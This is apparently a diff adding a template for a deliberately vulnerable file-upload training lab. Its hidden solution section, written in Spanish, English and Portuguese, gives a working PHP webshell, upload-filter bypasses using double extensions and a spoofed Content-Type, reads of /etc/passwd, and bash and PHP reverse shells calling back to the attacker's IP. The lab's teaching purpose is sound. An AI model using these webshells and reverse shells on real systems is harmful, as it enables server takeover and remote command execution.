@@ -1,0 +1,422 @@
+{% extends "base.html" %}
+{% block title %}V07 – File Upload – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="upload_obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400 mb-3" data-i18n="upload_obj_desc">El formulario guarda los archivos en /uploads/ y el servidor ejecuta como PHP cualquier archivo con extensión .php. Sube una webshell, consigue ejecución remota de comandos (RCE) y recupera la flag.</p>
+    <ol class="text-sm text-gray-600 dark:text-gray-400 ml-4 list-decimal space-y-1">
+      <li data-i18n="upload_obj_1">Sube una webshell PHP (según la dificultad, evade el filtro de extensión / MIME).</li>
+      <li data-i18n="upload_obj_2">Accede a ella en /uploads/&lt;archivo&gt;?cmd=id para confirmar el RCE.</li>
+      <li data-i18n="upload_obj_3">Vuelca el entorno del proceso para leer la flag: ?cmd=env o ?cmd=printenv+HL_FLAG.</li>
+    </ol>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="upload_obj_flag_lbl">Flag:</strong> <code>HL{···}</code> <span data-i18n="upload_obj_flag_hint">— valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <form id="upload-form" method="POST" action="/upload" enctype="multipart/form-data">
+      <label id="drop-zone" for="file-input"
+             style="display:block;border:2px dashed rgba(var(--hl-primary-rgb),.25);border-radius:.75rem;padding:2.5rem 1.5rem;text-align:center;cursor:pointer;transition:border-color .2s,background .2s">
+        <div style="pointer-events:none">
+          <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin:0 auto .875rem;opacity:.35;display:block">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+            <polyline points="17 8 12 3 7 8"/>
+            <line x1="12" y1="3" x2="12" y2="15"/>
+          </svg>
+          <p class="text-sm text-gray-500 dark:text-gray-400" data-i18n="upload_dropzone">Haz clic o arrastra archivos aquí</p>
+          <p class="text-xs text-gray-400 dark:text-gray-600 mt-1" data-i18n="upload_no_restrict">Sin restricciones de tipo de archivo</p>
+          <div id="file-label" class="mt-3 text-xs font-mono" style="color:var(--hl-primary);min-height:1.2em"></div>
+        </div>
+        <input type="file" id="file-input" name="file" multiple style="display:none">
+      </label>
+      <button type="submit" class="btn-primary w-full justify-center mt-3" data-i18n="upload_btn">Subir archivos</button>
+    </form>
+  </div>
+
+  {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}
+      {% for category, msg in messages %}
+        <div class="alert-{{ category if category in ['success','warning','error'] else 'success' }} mb-4 text-sm font-mono">{{ msg|striptags }}</div>
+      {% endfor %}
+    {% endif %}
+  {% endwith %}
+  {% if message %}
+  <div class="alert-success mb-4 text-sm font-mono">
+    {{ message|striptags }}
+    {% if uploaded_path %}
+    &nbsp;— <a href="{{ uploaded_path }}" target="_blank" class="underline font-bold" style="color:var(--hl-primary)" data-i18n="upload_open">Abrir archivo</a>
+    {% endif %}
+  </div>
+  {% endif %}
+
+  {% if uploaded_files %}
+  <div class="hl-card mb-4">
+    <div class="text-xs text-gray-400 font-medium mb-3" data-i18n="upload_list">Archivos subidos (/uploads/)</div>
+    <ul class="space-y-1.5 font-mono text-xs">
+      {% for f in uploaded_files %}
+      <li class="flex items-center justify-between group">
+        <span class="text-gray-700 dark:text-gray-300">{{ f }}</span>
+        <div class="flex items-center gap-2">
+          <a href="/uploads/{{ f }}" target="_blank" class="transition hover:opacity-70" style="color:var(--hl-primary)" data-i18n="upload_access">Acceder →</a>
+          <form method="POST" action="/uploads/delete/{{ f|urlencode }}" style="display:inline;margin:0;padding:0"
+                onsubmit="return showDeleteConfirm(this, {{ f|tojson }})">
+            <button type="submit" title="Eliminar archivo" aria-label="Eliminar archivo"
+                    style="background:none;border:none;cursor:pointer;padding:0;margin-left:8px;display:inline-flex;align-items:center;">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#e53e3e;vertical-align:middle;">
+                <polyline points="3 6 5 6 21 6"/>
+                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2"/>
+                <line x1="10" y1="11" x2="10" y2="17"/>
+                <line x1="14" y1="11" x2="14" y2="17"/>
+              </svg>
+            </button>
+          </form>
+        </div>
+      </li>
+      {% endfor %}
+    </ul>
+  </div>
+  {% endif %}
+</div>
+
+<!-- Modal de confirmación de borrado -->
+<div id="delete-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+  <div class="absolute inset-0 bg-black/60" style="backdrop-filter:blur(4px)" onclick="cancelDeleteAction()"></div>
+  <div class="relative rounded-2xl p-6 max-w-xs w-full shadow-2xl"
+       style="background:var(--bg-card,#1a1a2e);border:1px solid rgba(255,255,255,.1)">
+    <div class="flex items-center gap-3 mb-4">
+      <div class="flex-shrink-0 flex items-center justify-center rounded-full"
+           style="width:2.5rem;height:2.5rem;background:rgba(239,68,68,.15)">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="3 6 5 6 21 6"/>
+          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2"/>
+          <line x1="10" y1="11" x2="10" y2="17"/>
+          <line x1="14" y1="11" x2="14" y2="17"/>
+        </svg>
+      </div>
+      <div>
+        <p class="font-bold text-sm text-gray-900 dark:text-white" data-i18n="upload_del_title">Eliminar archivo</p>
+        <p class="text-xs text-gray-500 dark:text-gray-400 mt-0.5" data-i18n="upload_del_irrev">Esta acción no se puede deshacer</p>
+      </div>
+    </div>
+    <p class="text-sm text-gray-600 dark:text-gray-300 mb-5">
+      <span data-i18n="upload_del_confirm">¿Eliminar</span> <span id="confirm-filename" class="font-mono font-bold" style="color:var(--hl-primary)"></span>?
+    </p>
+    <div class="flex gap-2 justify-end">
+      <button onclick="cancelDeleteAction()" type="button"
+              class="text-sm px-4 py-1.5 rounded-lg transition"
+              style="border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);cursor:pointer;color:inherit"
+              data-i18n="upload_del_cancel">
+        Cancelar
+      </button>
+      <button onclick="confirmDeleteAction()" type="button"
+              class="text-sm px-4 py-1.5 rounded-lg font-semibold transition"
+              style="background:#ef4444;border:none;color:#fff;cursor:pointer"
+              data-i18n="upload_del_ok">
+        Eliminar
+      </button>
+    </div>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Sin restricciones</h3>
+    <p>El servidor acepta cualquier extensión. Sube directamente una webshell PHP.</p>
+    <ol>
+      <li>Crea la webshell y guárdala como <code>shell.php</code>:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
+      </li>
+      <li>Súbela:
+        <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifica ejecución de comandos:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
+curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
+      </li>
+      <li>Abre un listener en tu máquina atacante:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Lanza la reverse shell a través del parámetro <code>cmd</code>:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+      <li>Alternativa — reverse shell PHP directa. Sube este archivo como <code>revshell.php</code> y accede a él:
+        <pre>&lt;?php $sock=fsockopen("{{ client_ip }}",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?&gt;</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Blacklist bypass (doble extensión)</h3>
+    <p>El servidor bloquea <code>.php</code>, <code>.py</code>, <code>.sh</code>, etc. por extensión final, pero permite doble extensión como <code>.php.jpg</code>.</p>
+    <ol>
+      <li>Crea la webshell y renómbrala con doble extensión:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
+# guárdala directamente como shell.php.jpg, o:
+cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Súbela (la extensión final <code>.jpg</code> supera el blacklist):
+        <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifica ejecución:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Abre un listener en tu máquina atacante:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Lanza la reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+    </ol>
+
+    <h3>Hard — Whitelist + Content-Type bypass</h3>
+    <p>El servidor valida extensión por whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) y Content-Type. La doble extensión <code>.php.jpg</code> supera ambas comprobaciones.</p>
+    <ol>
+      <li>Prepara la webshell con doble extensión (igual que Medium):
+        <pre>cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Súbela forzando el Content-Type a <code>image/jpeg</code> para superar también la validación MIME:
+        <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifica ejecución:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Abre un listener en tu máquina atacante:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Lanza la reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+    </ol>
+
+    <h3>Capturar la flag</h3>
+    <p>La flag del lab vive en el entorno del proceso PHP y solo es accesible cuando tu webshell se ejecuta de verdad. Vuélcalo con el parámetro <code>cmd</code>:</p>
+    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
+# o directamente
+curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"</pre>
+    <p>Flag: <code>HL{···}</code>. Valídala en la caja «Validar Flag» al final de esta página.</p>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — No restrictions</h3>
+    <p>The server accepts any extension. Upload a PHP webshell directly.</p>
+    <ol>
+      <li>Create the webshell and save it as <code>shell.php</code>:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
+      </li>
+      <li>Upload it:
+        <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verify command execution:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
+curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
+      </li>
+      <li>Open a listener on your attacking machine:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Trigger the reverse shell via the <code>cmd</code> parameter:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+      <li>Alternative — direct PHP reverse shell. Upload this as <code>revshell.php</code> and access it:
+        <pre>&lt;?php $sock=fsockopen("{{ client_ip }}",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?&gt;</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Blacklist bypass (double extension)</h3>
+    <p>The server blocks <code>.php</code>, <code>.py</code>, <code>.sh</code>, etc. by final extension, but allows double extensions like <code>.php.jpg</code>.</p>
+    <ol>
+      <li>Create the webshell and rename it with a double extension:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
+# save it directly as shell.php.jpg, or:
+cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Upload it (the final <code>.jpg</code> extension bypasses the blacklist):
+        <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verify execution:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Open a listener on your attacking machine:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Trigger the reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+    </ol>
+
+    <h3>Hard — Whitelist + Content-Type bypass</h3>
+    <p>The server validates against a whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) and Content-Type. The double extension <code>.php.jpg</code> bypasses both checks.</p>
+    <ol>
+      <li>Prepare the webshell with a double extension (same as Medium):
+        <pre>cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Upload it forcing Content-Type to <code>image/jpeg</code> to also bypass MIME validation:
+        <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verify execution:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Open a listener on your attacking machine:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Trigger the reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+    </ol>
+
+    <h3>Capture the flag</h3>
+    <p>The lab flag lives in the PHP process environment and is only reachable once your webshell actually executes. Dump it through the <code>cmd</code> parameter:</p>
+    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
+# or directly
+curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"</pre>
+    <p>Flag: <code>HL{···}</code>. Validate it in the "Validate Flag" box at the bottom of this page.</p>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Fácil — Sem restrições</h3>
+    <p>O servidor aceita qualquer extensão. Faça upload direto de uma webshell PHP.</p>
+    <ol>
+      <li>Crie a webshell e salve-a como <code>shell.php</code>:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
+      </li>
+      <li>Envie o arquivo:
+        <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifique a execução de comandos:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
+curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
+      </li>
+      <li>Abra um listener na sua máquina de ataque:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Dispare a reverse shell através do parâmetro <code>cmd</code>:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+      <li>Alternativa — reverse shell PHP direta. Envie isto como <code>revshell.php</code> e acesse-o:
+        <pre>&lt;?php $sock=fsockopen("{{ client_ip }}",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?&gt;</pre>
+      </li>
+    </ol>
+
+    <h3>Médio — Bypass de blacklist (dupla extensão)</h3>
+    <p>O servidor bloqueia <code>.php</code>, <code>.py</code>, <code>.sh</code>, etc. pela extensão final, mas permite dupla extensão como <code>.php.jpg</code>.</p>
+    <ol>
+      <li>Crie a webshell e renomeie-a com dupla extensão:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
+# salve diretamente como shell.php.jpg, ou:
+cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Envie o arquivo (a extensão final <code>.jpg</code> burla a blacklist):
+        <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifique a execução:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Abra um listener na sua máquina de ataque:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Dispare a reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+    </ol>
+
+    <h3>Difícil — Bypass de whitelist + Content-Type</h3>
+    <p>O servidor valida por whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) e Content-Type. A dupla extensão <code>.php.jpg</code> burla ambas as validações.</p>
+    <ol>
+      <li>Prepare a webshell com dupla extensão (mesmo procedimento do Médio):
+        <pre>cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Envie forçando o Content-Type para <code>image/jpeg</code> para também burlar a validação MIME:
+        <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifique a execução:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Abra um listener na sua máquina de ataque:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Dispare a reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+    </ol>
+
+    <h3>Capturar a flag</h3>
+    <p>A flag do lab reside nas variáveis de ambiente do processo PHP e só pode ser acessada quando sua webshell for realmente executada. Extraia-a através do parâmetro <code>cmd</code>:</p>
+    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
+# ou diretamente
+curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"</pre>
+    <p>Flag: <code>HL{···}</code>. Valide-a no campo «Validar Flag» ao final desta página.</p>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
+  </div>
+</div>
+
+<script>
+// ── Dropzone drag & drop ──
+(function() {
+  const zone  = document.getElementById('drop-zone');
+  const input = document.getElementById('file-input');
+  if (!zone || !input) return;
+
+  function highlight(on) {
+    zone.style.borderColor = on ? 'var(--hl-primary)' : 'rgba(var(--hl-primary-rgb),.25)';
+    zone.style.background  = on ? 'rgba(var(--hl-primary-rgb),.05)' : '';
+  }
+
+  zone.addEventListener('mouseenter', () => highlight(true));
+  zone.addEventListener('mouseleave', () => highlight(false));
+  zone.addEventListener('dragover',   e => { e.preventDefault(); highlight(true); });
+  zone.addEventListener('dragleave',  e => { if (!zone.contains(e.relatedTarget)) highlight(false); });
+  zone.addEventListener('drop', e => {
+    e.preventDefault();
+    highlight(false);
+    const files = e.dataTransfer && e.dataTransfer.files;
+    if (!files || !files.length) return;
+    try {
+      const dt = new DataTransfer();
+      Array.from(files).forEach(f => dt.items.add(f));
+      input.files = dt.files;
+    } catch(_) {}
+    updateLabel(input);
+  });
+  input.addEventListener('change', () => updateLabel(input));
+})();
+
+// ── File label ──
+function updateLabel(input) {
+  const el = document.getElementById('file-label');
+  if (!el) return;
+  el.textContent = input.files && input.files.length
+    ? Array.from(input.files).map(f => f.name).join(', ')
+    : '';
+}
+
+// ── Delete modal ──
+var _pendingDeleteForm = null;
+
+function showDeleteConfirm(form, filename) {
+  _pendingDeleteForm = form;
+  var el = document.getElementById('confirm-filename');
+  if (el) el.textContent = filename;
+  var modal = document.getElementById('delete-modal');
+  if (modal) modal.classList.remove('hidden');
+  return false;
+}
+
+function confirmDeleteAction() {
+  var modal = document.getElementById('delete-modal');
+  if (modal) modal.classList.add('hidden');
+  if (_pendingDeleteForm) { _pendingDeleteForm.submit(); }
+  _pendingDeleteForm = null;
+}
+
+function cancelDeleteAction() {
+  var modal = document.getElementById('delete-modal');
+  if (modal) modal.classList.add('hidden');
+  _pendingDeleteForm = null;
+}
+</script>
+{% endblock %}
